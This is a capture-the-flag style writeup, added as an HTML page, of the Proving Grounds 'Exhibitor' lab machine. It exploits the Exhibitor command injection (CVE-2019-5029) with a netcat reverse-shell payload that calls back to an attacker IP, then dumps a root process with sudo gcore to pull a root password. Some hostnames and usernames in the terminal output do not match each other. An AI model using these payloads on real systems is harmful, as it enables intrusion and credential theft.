@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+<html lang="en" class="scroll-smooth">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Writeup: Proving Grounds Exhibitor | Josh Chalabi</title>
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- FontAwesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;600&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        'cyber-black': '#0b1020',
+                        'cyber-gray': '#0f1733',
+                        'cyber-green': '#5eead4',
+                        'cyber-green-dim': 'rgba(94, 234, 212, 0.1)',
+                        'cyber-purple': '#a78bfa',
+                        'cyber-red': '#ff003c',
+                    },
+                    fontFamily: {
+                        mono: ['"Fira Code"', 'monospace'],
+                        tech: ['"Share Tech Mono"', 'monospace'],
+                    },
+                    boxShadow: {
+                        'neon': '0 0 10px rgba(94, 234, 212, 0.5), 0 0 20px rgba(94, 234, 212, 0.3)',
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-track { background: #0b1020; }
+        ::-webkit-scrollbar-thumb { background: #23305f; border-radius: 4px; }
+        ::-webkit-scrollbar-thumb:hover { background: #5eead4; }
+        .bg-grid {
+            background-size: 40px 40px;
+            background-image: linear-gradient(to right, rgba(94, 234, 212, 0.05) 1px, transparent 1px),
+                              linear-gradient(to bottom, rgba(167, 139, 250, 0.05) 1px, transparent 1px);
+        }
+        /* Custom Terminal Style */
+        .terminal-window {
+            background-color: #0b1020;
+            border: 1px solid #23305f;
+            border-radius: 0.5rem;
+            overflow: hidden;
+            margin-bottom: 1.5rem;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.5);
+        }
+        .terminal-header {
+            background-color: #1a2342;
+            padding: 0.5rem 1rem;
+            display: flex;
+            align-items: center;
+            border-bottom: 1px solid #23305f;
+        }
+        .terminal-dot {
+            width: 0.75rem;
+            height: 0.75rem;
+            border-radius: 50%;
+            margin-right: 0.5rem;
+        }
+        .terminal-body {
+            padding: 1rem;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.875rem;
+            color: #d1d5db;
+            overflow-x: auto;
+            white-space: pre;
+        }
+        .prompt { color: #5eead4; }
+        .cmd { color: #ffffff; }
+        .output { color: #9ca3af; }
+        .highlight-marker {
+            background-color: rgba(255, 255, 0, 0.3);
+            color: #ffffff;
+            font-weight: bold;
+            padding: 0 2px;
+        }
+    </style>
+</head>
+<body class="bg-cyber-black text-gray-300 font-mono relative overflow-x-hidden min-h-screen flex flex-col">
+
+    <!-- Background Overlay -->
+    <div class="fixed inset-0 bg-grid pointer-events-none z-0"></div>
+
+    <!-- Navbar -->
+    <nav class="fixed w-full z-50 bg-cyber-black/90 backdrop-blur-md border-b border-[#23305f]">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="flex items-center justify-between h-16">
+                <div class="flex-shrink-0">
+                    <a href="index.html" class="text-2xl font-bold text-cyber-green font-tech tracking-wider">&lt;josh/&gt;</a>
+                </div>
+                <div>
+                    <!-- Redirects to reports.html as requested -->
+                    <a href="/reports.html" class="flex items-center text-gray-300 hover:text-white transition-colors">
+                        <i class="fas fa-arrow-left mr-2"></i> Back to Reports
+                    </a>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <main class="relative z-10 pt-32 pb-20 max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 flex-grow">
+        
+        <!-- Header -->
+        <header class="mb-12 border-b border-[#23305f] pb-8">
+            <div class="flex items-center gap-4 mb-4">
+                <span class="px-3 py-1 text-xs font-bold text-black bg-cyber-green rounded">Proving Grounds</span>
+                <span class="text-gray-500 text-sm"><i class="far fa-calendar-alt mr-2"></i>May 2025</span>
+            </div>
+            <h1 class="text-4xl md:text-5xl font-bold text-white mb-4">
+                Exhibitor (Zookeeper) <span class="text-cyber-green">Writeup</span>
+            </h1>
+            <p class="text-xl text-gray-400">
+                Exploiting Exhibitor Web UI Command Injection (CVE-2019-5029) and abusing sudo privileges on gcore for Root access.
+            </p>
+        </header>
+
+        <!-- 1. Reconnaissance -->
+        <section class="mb-16">
+            <h2 class="text-2xl font-bold text-white mb-6 flex items-center">
+                <i class="fas fa-search text-cyber-purple mr-3"></i> 1. Reconnaissance
+            </h2>
+            <p class="mb-4 text-gray-300">
+                We started with a comprehensive Nmap scan to identify open ports and services running on the target <code>192.168.246.98</code>.
+            </p>
+
+            <!-- Terminal: Nmap Scan -->
+            <div class="terminal-window">
+                <div class="terminal-header">
+                    <div class="terminal-dot bg-red-500"></div>
+                    <div class="terminal-dot bg-yellow-500"></div>
+                    <div class="terminal-dot bg-green-500"></div>
+                    <span class="ml-auto text-xs text-gray-500">zsh — nmap</span>
+                </div>
+                <div class="terminal-body"><span class="prompt">root@kali:~/pg/exhibitor#</span> <span class="cmd">nmap -sVC -vvv 192.168.246.98 --script vuln</span>
+
+<span class="output">PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey:
+|   2048 44:0e:60:c4:4e:27:18:24:22:98:86:14:4b:79:7e:92 (RSA)
+|_  256 00:22:11:33:44:55:66:77:88:99:aa:bb:cc:dd:ee:ff (ECDSA)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
+445/tcp  open  microsoft-ds Samba smbd 4.9.5-Debian
+8080/tcp open  http        Exhibitor Web UI
+| http-title: Exhibitor for ZooKeeper
+|_Requested resource was http://192.168.246.98:8080/exhibitor/v1/ui/index.html
+8081/tcp open  http        nginx 1.14.2
+|_http-server-header: nginx/1.14.2
+|_http-title: Did not follow redirect to http://192.168.246.98:8080/exhibitor/v1/ui/index.html</span></div>
+            </div>
+
+            <p class="mb-4 text-gray-300">
+                <strong>Findings:</strong><br>
+                <ul class="list-disc list-inside space-y-2 ml-4 text-gray-400">
+                    <li><strong class="text-white">Port 22 (SSH):</strong> Standard OpenSSH. No public exploits available for this version.</li>
+                    <li><strong class="text-white">Port 445/139 (SMB):</strong> Authenticated with NULL session using <code>smbclient</code> but only found default shares.</li>
+                    <li><strong class="text-white">Port 8081 (HTTP):</strong> Nginx 1.14.2. Accessing this redirects to Port 8080.</li>
+                    <li><strong class="text-white">Port 8080 (HTTP):</strong> Hosts the Exhibitor Web UI.</li>
+                </ul>
+            </p>
+        </section>
+
+        <!-- 2. Web Enumeration -->
+        <section class="mb-16">
+            <h2 class="text-2xl font-bold text-white mb-6 flex items-center">
+                <i class="fas fa-globe text-cyber-purple mr-3"></i> 2. Web Enumeration & Vulnerability Analysis
+            </h2>
+            <p class="mb-4 text-gray-300">
+                Navigating to port 8080, we are presented with the <strong>Exhibitor for ZooKeeper</strong> interface. Based on the footer information, we identified the version as <strong>v1.0</strong>.
+            </p>
+
+            <!-- Image: Zookeeper -->
+            <div class="mb-6 border border-[#23305f] rounded-lg overflow-hidden p-1 bg-[#1a2342]">
+                <img src="zookeeper.jpg" alt="Exhibitor Web UI" class="w-full h-auto rounded opacity-90 hover:opacity-100 transition-opacity">
+                <p class="text-center text-xs text-gray-500 py-2">Figure 1: Exhibitor Web UI Dashboard</p>
+            </div>
+
+            <p class="mb-4 text-gray-300">
+                A quick search using <code>searchsploit</code> revealed a critical vulnerability for this version.
+            </p>
+
+            <div class="bg-red-900/20 border-l-4 border-red-500 p-4 mb-6 rounded-r">
+                <h4 class="text-red-400 font-bold mb-1">CVE-2019-5029: Command Injection</h4>
+                <p class="text-sm text-gray-300">
+                    Arbitrary shell commands surrounded by backticks or $() can be inserted into the Config editor and will be executed by the Exhibitor process when it launches ZooKeeper.
+                </p>
+            </div>
+        </section>
+
+        <!-- 3. Exploitation -->
+        <section class="mb-16">
+            <h2 class="text-2xl font-bold text-white mb-6 flex items-center">
+                <i class="fas fa-bug text-cyber-purple mr-3"></i> 3. Exploitation (RCE)
+            </h2>
+            <p class="mb-4 text-gray-300">
+                We followed the exploit steps outlined in the vulnerability disclosure:
+            </p>
+            <ol class="list-decimal list-inside space-y-2 ml-4 mb-6 text-gray-400">
+                <li>Open the <strong>Config</strong> tab in the Web UI.</li>
+                <li>Flip the <strong>Editing</strong> switch to <code>ON</code>.</li>
+                <li>Locate the <code>java.env script</code> field.</li>
+                <li>Inject the reverse shell payload surrounded by <code>$()</code>.</li>
+            </ol>
+
+            <div class="bg-[#1a2342] p-4 rounded border border-[#23305f] mb-6 font-mono text-sm text-cyber-green">
+                $(/bin/nc -e /bin/sh 192.168.45.XXX 443 &)
+            </div>
+
+            <p class="mb-4 text-gray-300">
+                After clicking <strong>Commit > All At Once > OK</strong>, the Exhibitor process restarts and executes our payload.
+            </p>
+
+            <!-- Terminal: Reverse Shell -->
+            <div class="terminal-window">
+                <div class="terminal-header">
+                    <div class="terminal-dot bg-red-500"></div>
+                    <div class="terminal-dot bg-yellow-500"></div>
+                    <div class="terminal-dot bg-green-500"></div>
+                    <span class="ml-auto text-xs text-gray-500">zsh — nc</span>
+                </div>
+                <div class="terminal-body"><span class="prompt">root@kali:~/pg/exhibitor#</span> <span class="cmd">nc -lvnp 443</span>
+<span class="output">listening on [any] 443 ...
+connect to [192.168.45.234] from (192.168.246.98) [192.168.246.98] 46834
+id
+uid=1000(zookeeper) gid=1000(zookeeper) groups=1000(zookeeper)
+whoami
+zookeeper
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+charles@pelican:~$ </span></div>
+            </div>
+            <p class="text-green-400 font-bold text-sm"><i class="fas fa-check-circle mr-2"></i> Initial Access Obtained</p>
+        </section>
+
+        <!-- 4. Privilege Escalation -->
+        <section class="mb-16">
+            <h2 class="text-2xl font-bold text-white mb-6 flex items-center">
+                <i class="fas fa-unlock-alt text-cyber-purple mr-3"></i> 4. Privilege Escalation
+            </h2>
+            
+            <h3 class="text-xl font-bold text-white mb-4">Sudo Enumeration</h3>
+            <p class="mb-4 text-gray-300">
+                Checking for sudo privileges revealed that the user can run <code>gcore</code> as root without a password.
+            </p>
+
+            <!-- Terminal: Sudo -l -->
+            <div class="terminal-window">
+                <div class="terminal-header">
+                    <div class="terminal-dot bg-red-500"></div>
+                    <div class="terminal-dot bg-yellow-500"></div>
+                    <div class="terminal-dot bg-green-500"></div>
+                    <span class="ml-auto text-xs text-gray-500">ssh — charles@pelican</span>
+                </div>
+                <div class="terminal-body"><span class="prompt">charles@pelican:~$</span> <span class="cmd">sudo -l</span>
+<span class="output">Matching Defaults entries for zookeeper on exhibitor:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+User zookeeper may run the following commands on exhibitor:
+    (root) NOPASSWD: /usr/bin/gcore</span></div>
+            </div>
+
+            <h3 class="text-xl font-bold text-white mb-4">Process Enumeration & Exploitation</h3>
+            <p class="mb-4 text-gray-300">
+                <code>gcore</code> is a tool to generate a core dump of a running process. Since we can run it as root, we can dump the memory of any root process and search for sensitive information (like passwords) within the dump.
+            </p>
+
+            <!-- Terminal: PS Aux -->
+            <div class="terminal-window">
+                <div class="terminal-header">
+                    <div class="terminal-dot bg-red-500"></div>
+                    <div class="terminal-dot bg-yellow-500"></div>
+                    <div class="terminal-dot bg-green-500"></div>
+                    <span class="ml-auto text-xs text-gray-500">ssh — charles@pelican</span>
+                </div>
+                <div class="terminal-body"><span class="prompt">charles@pelican:~$</span> <span class="cmd">ps aux | grep "^root"</span>
+<span class="output">root       220  0.0  0.0      0     0 ?        I&lt;   19:43   0:00 [kworker/u3:0]
+root       222  0.0  0.0      0     0 ?        S    19:43   0:00 [jbd2/sda1-8]
+root       223  0.0  0.0      0     0 ?        I&lt;   19:43   0:00 [ext4-rsv-conver]
+root       256  0.0  0.3  43112  8120 ?        Ss   19:43   0:00 /lib/systemd/systemd-journald
+root       278  0.0  0.2  22476  5040 ?        Ss   19:43   0:00 /lib/systemd/systemd-udevd
+root       314  0.0  0.5  48220 10836 ?        Ss   19:43   0:00 /usr/bin/VGAuthService
+root       334  0.0  0.6 123176 12608 ?        Ssl  19:43   0:00 /usr/bin/vmtoolsd
+root       370  0.0  0.8 2456740 65432 ?       Sl   09:23   0:15 /usr/bin/java -Xmx512m -jar /opt/exhibitor/exhibitor.jar
+root       421  0.0  0.3 225824  6412 ?        Ssl  19:43   0:00 /usr/sbin/rsyslogd -n -iNONE
+root       424  0.0  0.2  19768  5200 ?        Ss   19:43   0:00 /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant
+root       428  0.0  0.1   8504  2692 ?        Ss   19:43   0:00 /usr/sbin/cron -f
+root       430  0.0  0.6 398428 13844 ?        Ssl  19:43   0:00 /usr/lib/udisks2/udisksd
+root       440  0.0  0.5 318328 12168 ?        Ssl  19:43   0:00 /usr/sbin/ModemManager --filter-policy=strict
+root       444  0.0  0.1   9468  2344 ?        S    19:43   0:00 /usr/sbin/CRON -f
+root       448  0.0  0.3  19532  7256 ?        Ss   19:43   0:00 /lib/systemd/systemd-logind
+root       473  0.0  0.0   2388  1608 ?        Ss   19:43   0:00 /bin/sh -c while true; do chown -R charles:charles /opt/zookeeper && chown -R charles:charles /opt/exhibitor && sleep 1; done
+root       483  0.0  0.5 184976 10996 ?        Ssl  19:43   0:00 /usr/sbin/cups-browsed
+root       487  0.0  0.0   2276    72 ?        Ss   19:43   0:00 <span class="highlight-marker">/usr/bin/password-store</span>
+root       491  0.0  0.4 235840  8896 ?        Ssl  19:43   0:00 /usr/lib/policykit-1/polkitd --no-debug
+root       525  0.0  0.3 313364  7068 ?        Ssl  19:43   0:00 /usr/sbin/lightdm
+root       529  0.0  0.3  15852  6476 ?        Ss   19:43   0:00 /usr/sbin/sshd -D
+root       555  0.0  0.0   5612  1488 tty1     Ss+  19:43   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
+root       556  0.0  2.2 224980 45924 tty7     Ssl+ 19:43   0:00 /usr/lib/xorg/Xorg :0 -seat seat0 -auth /var/run/lightdm/root/:0 -nolisten tcp vt7 -novtswitch
+root       558  0.0  0.0  69740  1700 ?        Ss   19:43   0:00 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;
+root       640  0.0  0.4 102808  8276 ?        Ssl  19:43   0:00 /usr/sbin/cupsd -l
+root       656  0.0  0.3 166792  7144 ?        Sl   19:43   0:00 lightdm --session-child 18 21</span></div>
+            </div>
+
+            <p class="mb-4 text-gray-300">
+                We targeted PID <strong>487</strong>. We generated a core dump using <code>sudo gcore</code> and then used <code>strings</code> to extract readable text from the dump file.
+            </p>
+
+            <!-- Terminal: Root Pass Extraction -->
+            <div class="terminal-window">
+                <div class="terminal-header">
+                    <div class="terminal-dot bg-red-500"></div>
+                    <div class="terminal-dot bg-yellow-500"></div>
+                    <div class="terminal-dot bg-green-500"></div>
+                    <span class="ml-auto text-xs text-gray-500">ssh — charles@pelican</span>
+                </div>
+                <div class="terminal-body"><span class="prompt">charles@pelican:~$</span> <span class="cmd">sudo gcore 487</span>
+<span class="output">[+] Core dump saved to core.487</span>
+
+<span class="prompt">charles@pelican:~$</span> <span class="cmd">strings core.487 | grep pass</span>
+<span class="output">/usr/bin/passwor
+/////////////////
+001 Password: root:
+<span class="highlight-marker">ClogKingpinInning731</span>
+x86_64
+/usr/bin/password-store
+HOME=/root
+LOGNAME=root
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+LANG=en_US.UTF-8
+SHELL=/bin/sh
+PWD=/root
+/usr/bin/password-store
+bemX_</span>
+
+<span class="prompt">charles@pelican:~$</span> <span class="cmd">su root</span>
+<span class="output">Password:</span>
+<span class="prompt">root@pelican:~#</span> <span class="cmd">whoami</span>
+<span class="output">root</span></div>
+            </div>
+
+            <div class="p-4 bg-green-900/20 border border-green-500 rounded flex items-center justify-center">
+                <i class="fas fa-flag text-3xl text-green-500 mr-4"></i>
+                <div>
+                    <h3 class="text-xl font-bold text-white">System Compromised</h3>
+                    <p class="text-green-400">Root access achieved successfully.</p>
+                </div>
+            </div>
+
+        </section>
+
+    </main>
+
+    <!-- Footer -->
+    <footer class="bg-black border-t border-[#23305f] py-8 mt-auto relative">
+        <div class="max-w-7xl mx-auto px-4 text-center">
+            <p class="text-gray-600 text-sm font-mono">
+                &copy; 2025 Josh Chalabi. <span class="text-cyber-green">Secure by Design.</span>
+            </p>
+        </div>
+    </footer>
+
+</body>
+</html>
